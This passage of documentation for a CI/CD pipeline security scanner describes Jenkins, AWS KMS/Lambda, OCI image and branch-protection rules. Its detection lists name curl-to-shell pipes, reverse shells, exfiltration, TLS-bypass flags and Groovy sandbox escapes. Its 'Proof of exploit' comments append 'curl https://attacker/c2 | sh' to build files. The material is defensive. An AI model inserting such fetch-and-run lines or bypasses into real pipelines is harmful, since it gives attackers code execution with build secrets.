**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-010`](../providers/jenkins.md#jf-010) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-012`: `load` step pulls Groovy from disk without integrity pin <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-012 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** `load 'foo.groovy'` evaluates whatever exists at the path when the build runs, there's no integrity check, so a workspace mutation can swap the loaded code between runs.

**Recommendation.** Move shared Groovy into a Jenkins shared library (`@Library('name@<sha>')`). Those are version-pinned and JF-001 audits them. Reserve `load` for one-off development experiments.

**Source:** [`JF-012`](../providers/jenkins.md#jf-012) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-013`: copyArtifacts ingests another job's output unverified <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-jf-013 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Recognizes both `copyArtifacts(projectName: ...)` and the older `step([$class: 'CopyArtifact', ...])` form. If the upstream job accepts multibranch or PR builds, the artifact may have been produced by attacker-controlled code.

**Recommendation.** Add a verification step before consuming the artifact: `sh 'sha256sum -c manifest.sha256'` against a manifest the producer signed, or `cosign verify` over the artifact directly. Restrict the upstream job to non-PR builds via branch protection if verification isn't feasible.

**Source:** [`JF-013`](../providers/jenkins.md#jf-013) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-016`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-016 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Detects `curl | bash`, `wget | sh`, and similar patterns that pipe remote content directly into a shell interpreter inside a Jenkinsfile. An attacker who controls the remote endpoint (or poisons DNS / CDN) gains arbitrary code execution in the build agent.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.

**Source:** [`JF-016`](../providers/jenkins.md#jf-016) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-018 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a Jenkinsfile. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-018`](../providers/jenkins.md#jf-018) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-019`: Groovy sandbox escape pattern detected <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-jf-019 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Detects Groovy patterns that bypass the Jenkins script security sandbox: `Runtime.getRuntime()`, `Class.forName()`, `.classLoader`, `ProcessBuilder`, and `@Grab`. These give the pipeline (or an attacker who controls its source) unrestricted access to the Jenkins controller JVM, full RCE.

**Recommendation.** Remove direct Runtime/ClassLoader calls. Use Jenkins pipeline steps instead. Avoid @Grab for untrusted dependencies.

**Source:** [`JF-019`](../providers/jenkins.md#jf-019) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-020`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-020 }

**Evidences:** [`SAST`](#ctrl-sast) Project uses static analysis / vulnerability scanning, [`Vulnerabilities`](#ctrl-vulnerabilities) Project scans for and resolves known vulnerabilities.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck. Comments are stripped before matching.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`JF-020`](../providers/jenkins.md#jf-020) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-021 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-021`](../providers/jenkins.md#jf-021) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-022 }

**Evidences:** [`Dependency-Update-Tool`](#ctrl-dependency-update-tool) Project uses an automated dependency-update tool (Dependabot / Renovate).

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR pipeline (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`JF-022`](../providers/jenkins.md#jf-022) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-023 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-023`](../providers/jenkins.md#jf-023) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-024`: `input` approval step missing submitter restriction <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-024 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** JF-005 already flags deploy stages with no ``input`` step. This rule catches the subtler case: the gate exists, but it doesn't actually restrict approvers. ``submitter`` accepts a comma-separated list of Jenkins usernames and group names; scope it to the smallest release-eligible pool.

**Recommendation.** Add a ``submitter: 'releasers,sre'`` (or a single role) argument to every ``input`` step in a deploy-like stage. Without it, any user with the Jenkins job ``Build`` permission can approve a production promotion, the approval gate becomes advisory.

**Source:** [`JF-024`](../providers/jenkins.md#jf-024) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-026`: `build job:` trigger ignores downstream failure <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-026 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** The Jenkins Pipeline plugin defaults ``wait`` to ``true`` and ``propagate`` to ``true``, but either can be flipped per call. ``wait: false`` returns immediately; ``propagate: false`` continues even when the downstream job fails or is aborted. Both patterns sever the flow-control link between the upstream approval gate and the work the downstream job is about to do.

**Recommendation.** Remove ``wait: false`` and ``propagate: false`` from every ``build job:`` step, or replace them with an explicit ``currentBuild.result = build(...).result`` check. A fire-and-forget trigger can silently ship broken artifacts because the upstream job reports success regardless of what the downstream job actually did.

**Source:** [`JF-026`](../providers/jenkins.md#jf-026) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-028`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-028 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** ``cosign sign`` signs the artifact bytes. ``cosign attest`` signs an in-toto statement describing how the build ran, builder, source commit, input parameters. SLSA L3 verifiers check the latter so consumers can enforce policy on where and how artifacts were produced.

**Recommendation.** Add a ``sh 'cosign attest --predicate=provenance.intoto.jsonl …'`` step after the build, or integrate the TestifySec ``witness run`` attestor. JF-006 covers signing; this rule covers the build-provenance statement SLSA Build L3 requires.

**Source:** [`JF-028`](../providers/jenkins.md#jf-028) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-029`: Jenkinsfile contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-jf-029 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Distinct from JF-016 (curl pipe) and JF-019 (Groovy sandbox escape). Those flag risky defaults; this flags concrete evidence, reverse shells, base64-decoded execution, miner binaries, exfil channels, credential-dump pipes, shell-history erasure. Runs on the comment-stripped Groovy text so ``// cosign verify … // webhook.site`` in a legitimate annotation doesn't false-positive.

**Recommendation.** Treat as a potential compromise. Identify the commit that introduced the matching stage(s), rotate Jenkins credentials the job can reach, review controller/agent audit logs for outbound traffic to the matched hosts, and re-image the agent pool if the compromise may have persisted.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`JF-029`](../providers/jenkins.md#jf-029) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-030`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-030 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Complements JF-002 (script injection from untrusted build parameters). Fires on intrinsically risky shell idioms, ``eval``, ``sh -c "$X"``, backtick exec, regardless of whether the input source is currently trusted.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec with direct command invocation. Validate any value feeding a dynamic command at the boundary, or pass arguments as a list to a real ``sh`` step so the shell is not re-invoked.

**Known false positives.**

- ``sh 'eval "$(ssh-agent -s)"'`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.

**Source:** [`JF-030`](../providers/jenkins.md#jf-030) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-031`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-031 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Complements JF-021 (missing lockfile flag). Git URL installs without a commit pin, local-path installs, and direct tarball URLs bypass the registry integrity controls the lockfile relies on.

**Recommendation.** Pin git dependencies to a commit SHA. Publish private packages to an internal registry (Artifactory, Nexus) instead of installing from a filesystem path or tarball URL.

**Source:** [`JF-031`](../providers/jenkins.md#jf-031) in the [Jenkins provider](../providers/jenkins.md).

#### `KMS-001`: KMS customer-managed key has rotation disabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-kms-001 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Annual rotation regenerates the underlying key material for the same CMK ARN. Existing ciphertexts can still be decrypted (KMS keeps old material around), but new encrypts use the new material, so a cryptographic exposure (side-channel, an accidental export, an old compromised offline backup) only protects ciphertexts from before the rotation.

**Recommendation.** Enable annual rotation on every customer-managed KMS key used for CI/CD artifact, log, and secret encryption. Unrotated CMKs keep the same key material indefinitely, so a single cryptographic exposure (side-channel, accidental export) is permanent.

**Source:** [`KMS-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `KMS-002`: KMS key policy grants wildcard KMS actions <span class="pg-sev pg-sev--high">HIGH</span> { #detail-kms-002 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** ``kms:*`` on a key policy is administrative authority over the cipher boundary: ``CancelKeyDeletion``, ``ScheduleKeyDeletion``, ``ReEncrypt``, ``UpdateKeyDescription``, and the data-plane decrypt actions all collapse into one grant. A CI/CD principal almost never needs more than the data-plane subset (``Decrypt`` / ``GenerateDataKey`` / ``Encrypt``).

**Recommendation.** Replace ``kms:*`` grants with specific actions needed by the caller (e.g. ``kms:Decrypt``, ``kms:GenerateDataKey``). Key-policy wildcard grants let any holder of the principal re-key, schedule deletion, or export material at will.

**Source:** [`KMS-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `LMB-001`: Lambda function has no code-signing config <span class="pg-sev pg-sev--high">HIGH</span> { #detail-lmb-001 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** Lambda code-signing config + a Signer profile (SIGN-001) validates that an uploaded zip was signed by a known profile before it's allowed to run. Without one, anyone who reaches ``lambda:UpdateFunctionCode``, a CI/CD role compromise, a misattached IAM policy, can replace the function's code with no chain-of-custody check.

**Recommendation.** Create an AWS Signer profile, reference it from an ``aws_lambda_code_signing_config`` with ``untrusted_artifact_on_deployment = Enforce`` and attach that config to the function. Without one, the Lambda runtime will execute any code that a principal with lambda:UpdateFunctionCode uploads.

**Source:** [`LMB-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `LMB-002`: Lambda function URL has AuthType=NONE <span class="pg-sev pg-sev--high">HIGH</span> { #detail-lmb-002 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** A Lambda function URL with ``AuthType=NONE`` is a public HTTPS endpoint. Anyone who knows the URL can invoke. This is sometimes deliberate (a webhook receiver) but the deliberate version typically signs / validates inside the function, the rule fires regardless because the IAM-side control isn't there.

**Recommendation.** Set the function URL ``auth_type`` to ``AWS_IAM`` and grant ``lambda:InvokeFunctionUrl`` through IAM. ``NONE`` exposes the function to the public internet without authentication.

**Source:** [`LMB-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `LMB-003`: Lambda function env vars may contain plaintext secrets <span class="pg-sev pg-sev--high">HIGH</span> { #detail-lmb-003 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Lambda env vars are world-readable to any principal with ``lambda:GetFunctionConfiguration``, much wider than the principal that can invoke the function. They also persist in CloudFormation drift, change-sets, and CloudTrail events. A secret in a Lambda env var is essentially exposed to anyone with read access to the account.

**Recommendation.** Move secrets out of Lambda environment variables and into Secrets Manager or SSM Parameter Store. Environment variables are visible to anyone with ``lambda:GetFunctionConfiguration`` and persist in CloudTrail events, which keeps the secret in audit logs.

**Source:** [`LMB-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `LMB-004`: Lambda resource policy allows wildcard principal <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-lmb-004 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** A wildcard-principal Allow on a Lambda function resource policy lets anyone invoke. The legitimate case is a service principal (API Gateway, S3 events) where AWS fills in the SourceArn/SourceAccount at invoke time, without those conditions, any account using that service can invoke.

**Recommendation.** Remove Allow statements with ``Principal: '*'`` from every Lambda function resource policy, or scope them with a ``SourceArn`` / ``SourceAccount`` condition. Service principals (e.g. ``apigateway.amazonaws.com``) are the common legitimate case, ensure they carry a condition.

**Source:** [`LMB-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `OCI-001`: Image manifest is missing OCI provenance annotations <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-oci-001 }

**Evidences:** [`SBOM`](#ctrl-sbom) Releases publish a software bill of materials.

**How this is detected.** Without these two annotations a pulled image can't be traced back to a source revision, so an incident-response team has no way to reach the build that produced it. The rule fires on whichever layer the manifest carries (top-level for an index, sub-manifest for a per-platform image); DF-016 catches the same gap at Dockerfile authoring time, OCI-001 catches it once the image has been built and any later ``docker buildx --annotation`` overrides have already been applied.

**Recommendation.** Stamp the image with at least ``org.opencontainers.image.source`` (the URL of the source repo) and ``org.opencontainers.image.revision`` (the commit SHA built into the image). With ``docker buildx`` this is ``--label org.opencontainers.image.source=...`` plus ``--label org.opencontainers.image.revision=...`` at build time, or set them as image annotations through ``--annotation`` so they appear on the manifest itself (``manifest.annotations`` is what registries surface to ``manifest inspect``).

**Known false positives.**

- Throwaway / scratch images that never leave a developer's machine (e.g. ``image inspect`` of an intermediate build stage) don't need provenance annotations. Suppress via ignore-file rather than removing the rule.

**Source:** [`OCI-001`](../providers/oci.md#oci-001) in the [OCI manifest provider](../providers/oci.md).

#### `OCI-002`: Image is missing a build attestation manifest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-oci-002 }

**Evidences:** [`SBOM`](#ctrl-sbom) Releases publish a software bill of materials, [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** Build attestations are the canonical place for SLSA provenance and SBOM data on an OCI image. A multi-platform image index that ships per-architecture manifests but no attestation-manifest sibling means there's no signed record of how the image was built or what's inside it, so consumers can't enforce SLSA Build-L2+ or feed an SBOM into vulnerability triage. A single-platform manifest (no image index) also fails this rule, attestations require the index-of-manifests shape that BuildKit produces by default.

**Recommendation.** Build the image with ``docker buildx build --attest=type=provenance,mode=max --attest=type=sbom`` (or the equivalent BuildKit frontend flags). Both attestations land as sibling sub-manifests inside the image index, annotated with ``vnd.docker.reference.type: attestation-manifest`` and linked to their target manifest via ``vnd.docker.reference.digest``. Verify after pushing with ``docker buildx imagetools inspect <ref>``, the ``Attestations`` section should list both predicate types.

**Known false positives.**

- Intermediate / cache-only images pushed by CI for later-stage consumption may legitimately ship without attestations to keep build artifacts small. Suppress via ignore-file when this is the deliberate shape, the default expectation for any image that reaches a production registry is a full attestation set.
- Some registries strip the attestation sub-manifests on pull (``docker pull`` of a single platform unwraps the index). If the JSON you're scanning came from ``docker manifest inspect`` rather than ``docker buildx imagetools inspect --raw``, attestations may be invisible even when present upstream.

**Source:** [`OCI-002`](../providers/oci.md#oci-002) in the [OCI manifest provider](../providers/oci.md).

#### `OCI-004`: Image layer references an arbitrary URL (foreign layer) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-oci-004 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** A layer with a ``urls:`` field is fetched from whatever URL the manifest declares, not from the registry the image was pulled from. The digest is still verified after the fetch, so a passive attacker can't substitute a different blob, but an attacker who controls the URL endpoint can serve different content depending on the client (server-side cloaking) or simply take the endpoint offline to break image pulls. The rule fires on any layer whose descriptor includes a non-empty ``urls:`` array; it doesn't try to validate URL hygiene (HTTPS, allow-list of hosts) since the existence of the field alone is the policy violation.

**Recommendation.** Rebuild the image without foreign-layer references. The OCI / Docker spec lets a layer descriptor carry a ``urls:`` field that tells the client to pull the layer blob from an arbitrary HTTP location at image-pull time, bypassing the registry's content-addressed store. The mechanism exists for proprietary base layers (notably Windows Server base images that ship from ``mcr.microsoft.com``) but is increasingly deprecated, modern Windows images at ``mcr.microsoft.com/windows/servercore:ltsc2022`` no longer use it. If the foreign URL is genuinely required, host the blob inside your own registry and pin it by digest the same as any other layer.

**Known false positives.**

- Legacy Windows Server base images (pre-Windows 11 / Server 2022) ship layers from ``mcr.microsoft.com`` with this mechanism. Suppress via ignore-file when the Windows image is intentional, the rule has no way to distinguish a Microsoft-blessed URL from any other.

**Source:** [`OCI-004`](../providers/oci.md#oci-004) in the [OCI manifest provider](../providers/oci.md).

#### `OCI-007`: Image manifest uses legacy schemaVersion 1 (no content addressing) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-oci-007 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** The OCI image-spec (1.0+) and Docker Distribution v2 both encode ``schemaVersion: 2`` on every manifest. The older Docker v1 format set ``schemaVersion: 1`` and stored the rootfs as a chain of un-addressed tarballs with the chain identity hashed end-to-end at pull time. Anything below 2 is by definition a non-content-addressed manifest. The detection is a strict equality check against schemaVersion.

**Recommendation.** Rebuild and re-push the image with a current builder (``docker buildx build`` / ``buildah`` / ``ko``) so the registry produces a v2 manifest with content-addressed layer descriptors. Docker Distribution v1 manifests predate the digest-pinned design that lets a client verify a pulled blob matches the manifest the registry served, so a v1 pull has no way to detect tampering between the registry and the runtime. Registries have been refusing v1 pushes for years (Docker Hub since 2019, GHCR / quay.io / ECR / Artifact Registry never supported them on read), but a pre-existing v1 image can still be sitting in a private registry; the rule catches it before that image gets promoted.

**Known false positives.**

- Some internal Harbor / Nexus deployments still proxy legacy Docker images that haven't been rebuilt; a pull succeeds because the proxy upgrades the manifest at request time, but the on-disk JSON if you saved it with ``inspect --raw`` may still report the original schemaVersion. If your registry is doing this in-flight promotion you can suppress; otherwise re-run the build.

**Source:** [`OCI-007`](../providers/oci.md#oci-007) in the [OCI manifest provider](../providers/oci.md).

#### `OCI-008`: Manifest references digest using unsupported hash algorithm <span class="pg-sev pg-sev--high">HIGH</span> { #detail-oci-008 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** The OCI image-spec mandates ``sha256:`` or ``sha512:`` for content descriptors. ``sha1:`` and ``md5:`` were never permitted by the spec but show up occasionally in mirror exports and forensic JSON; this rule catches them.

Detection scope: the config descriptor digest, every layer descriptor digest (single-image manifests), and every sub-manifest entry digest in an image index. The matcher accepts ``sha256:`` and ``sha512:`` as the only valid prefixes; anything else fires.

**Recommendation.** Rebuild and re-push the image so every descriptor (config, layers, sub-manifest entries) carries a ``sha256:`` digest. ``sha512:`` is also acceptable per the OCI spec, but anything weaker (md5, sha1) breaks the integrity guarantee the registry pull is supposed to provide. sha1 has had practical collisions since SHAttered (2017); md5 has had them since the early 2000s. A manifest that pins a layer by sha1 lets an attacker who can produce a colliding blob substitute a different tarball without changing the manifest, the registry's content-addressing then ratifies the substitution.

**Known false positives.**

- Test fixtures and intentionally-corrupt CTF images sometimes use degraded hashes for pedagogical reasons. Suppress on the specific path with an ignore-file when this is the deliberate shape.

**Source:** [`OCI-008`](../providers/oci.md#oci-008) in the [OCI manifest provider](../providers/oci.md).

#### `SCM-001`: Default branch has no protection rule <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-001 }

**Evidences:** [`Branch-Protection`](#ctrl-branch-protection) Default branch is protected against force-push, deletion, and direct push without review.

**How this is detected.** Without a branch protection rule on the default branch, anyone with write access can force-push, delete the branch, or merge directly without review. Even when CI runs on the branch, an unprotected default branch lets a single compromised maintainer rewrite history and erase the audit trail. The check is sourced from the GitHub REST API (``GET /repos/{owner}/{repo}/branches/{branch}/protection``); a 404 response is itself the failure signal.

**Recommendation.** Add a branch protection rule on the default branch in the repository's Settings -> Branches. At minimum require pull request reviews before merging, require status checks to pass, and disable force-pushes / deletions. Match the rule to OpenSSF Scorecard's Branch-Protection thresholds for the organization's compliance baseline.

**Seen in the wild.**

- Numerous post-incident reports (PyPI / RubyGems package compromises 2018-2024) trace the initial maintainer-account takeover step to the absence of branch protection: the attacker pushed a single tampered commit to the default branch, the release pipeline ran on push, the malicious build shipped to the registry within minutes, and recovery required force-pushing the audit trail itself. Branch protection turns the entire class of attack into a review-then-merge gate.

**Proof of exploit.**

# With no protection rule on ``main``, a single compromised
# maintainer credential is enough to ship a tampered build:
#
#   git checkout main
#   echo 'curl https://attacker/c2 | sh' >> Makefile
#   git commit -am 'fix: tweak'
#   git push origin main           # no review required
#   # CI now runs the tampered build with full secret access.
#
# Recovery needs force-push to rewrite the trail:
#   git push --force origin main   # also unprotected
#
# A protection rule with `required_pull_request_reviews` set
# and `allow_force_pushes: false` blocks both the push and
# the rewrite without giving up an inch of velocity.

**Source:** [`SCM-001`](../providers/scm.md#scm-001) in the [SCM provider](../providers/scm.md).

#### `SCM-002`: Default branch protection does not require pull request reviews <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-002 }

**Evidences:** [`Branch-Protection`](#ctrl-branch-protection) Default branch is protected against force-push, deletion, and direct push without review, [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** Reads ``required_pull_request_reviews.required_approving_review_count`` from the branch protection payload. Fires when the field is absent (no review requirement at all) or when the count is 0. ``SCM-001`` covers the case where no protection rule exists; this rule scopes specifically to the review-count knob inside an existing rule.

**Recommendation.** In the default-branch protection rule, enable ``Require a pull request before merging`` and set the minimum approving review count to at least 1 (Scorecard's threshold for Branch-Protection's middle tier; raise to 2 for higher trust). Combine with ``Dismiss stale pull request approvals when new commits are pushed`` so a force-push doesn't carry an old approval forward.

**Known false positives.**

- ``required_pull_request_reviews.bypass_pull_request_allowances`` is covered by ``SCM-018``: a protection rule that requires reviews but lists every contributor in the bypass allowlist still passes this rule even though the control is unenforced in practice. Read SCM-002 + SCM-018 as a pair when auditing whether required review actually fires.

**Proof of exploit.**

# With protection but no required reviews, a maintainer can
# self-approve a tampered change in two clicks:
#
#   git checkout -b release-fix
#   echo 'curl https://attacker/c2 | sh' >> deploy.sh
#   git commit -am 'fix: handle edge case'
#   git push origin release-fix
#   gh pr create --fill
#   gh pr merge --squash --auto    # no second-set-of-eyes
#   # Release pipeline runs the tampered build with full
#   # production secrets in scope.
#
# Setting ``required_approving_review_count`` to >= 1 forces
# a separate identity to acknowledge the change before merge.

**Source:** [`SCM-002`](../providers/scm.md#scm-002) in the [SCM provider](../providers/scm.md).

#### `SCM-003`: GitHub default code scanning is not enabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-003 }

**Evidences:** [`SAST`](#ctrl-sast) Project uses static analysis / vulnerability scanning.

**How this is detected.** Reads ``state`` from the default code-scanning setup endpoint (``GET /repos/{owner}/{repo}/code-scanning/default-setup``). Fires when ``state`` is anything other than ``configured`` (``not-configured``, missing, or 404). This check only evaluates the default-setup endpoint. Repos running hand-authored CodeQL workflows or third-party SARIF uploads can still fail SCM-003; suppress per repo via ignore-file when that alternative coverage is intentional.

**Recommendation.** Enable default code scanning under the repository's Settings -> Code security -> Code scanning -> Default. The GitHub-managed CodeQL setup picks the right languages automatically and writes findings into the Code Scanning UI on every push and PR. Teams that already ship a CodeQL workflow can leave this rule's check off — but the default setup is the lowest-friction path for repos that don't have one.

**Known false positives.**

- Repos that ship a hand-authored CodeQL workflow (or use Semgrep / Snyk / another SAST whose results land in the Code Scanning UI via SARIF upload) get the same coverage without enabling default setup. Suppress via ignore-file rather than removing the rule.

**Proof of exploit.**

# Without code scanning, the only signal that a PR
# introduces (e.g.) a SQL injection or hardcoded secret
# comes from the human reviewer:
#
#   - def lookup(user_id):
#   -     return db.query("SELECT * FROM u WHERE id = ?", user_id)
#   + def lookup(user_id):
